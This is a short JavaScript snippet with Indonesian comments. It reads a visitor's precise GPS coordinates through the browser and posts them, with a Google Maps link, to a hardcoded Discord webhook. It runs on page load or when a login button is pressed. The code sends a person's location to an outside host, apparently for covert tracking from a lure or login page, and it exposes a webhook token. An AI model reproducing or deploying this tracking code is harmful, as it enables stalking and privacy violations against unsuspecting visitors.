function kirimLokasiKeDiscord() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            // Link webhook Anda
            const webhookURL = "https://discord.com/api/webhooks/1516627039753605140/8VNqYb-cIYMLTg4dBoS1g2exxqGa4I51eQb8fU-xo9l8x1U2AjQR7Bs7MCkyQFrPR_GV";

            const payload = {
                content: `📍 **Lokasi Pengguna Baru**\nLatitude: ${lat}\nLongitude: ${lon}\nMaps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}`
            };

            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                console.log("Lokasi berhasil dikirim!");
            } catch (error) {
                console.error("Gagal mengirim ke Discord:", error);
            }
        }, (error) => {
            console.error("Akses lokasi ditolak atau gagal:", error.message);
        });
    } else {
        console.error("Browser tidak mendukung geolokasi.");
    }
}

// Panggil fungsi ini saat tombol login ditekan atau saat halaman dimuat
kirimLokasiKeDiscord();
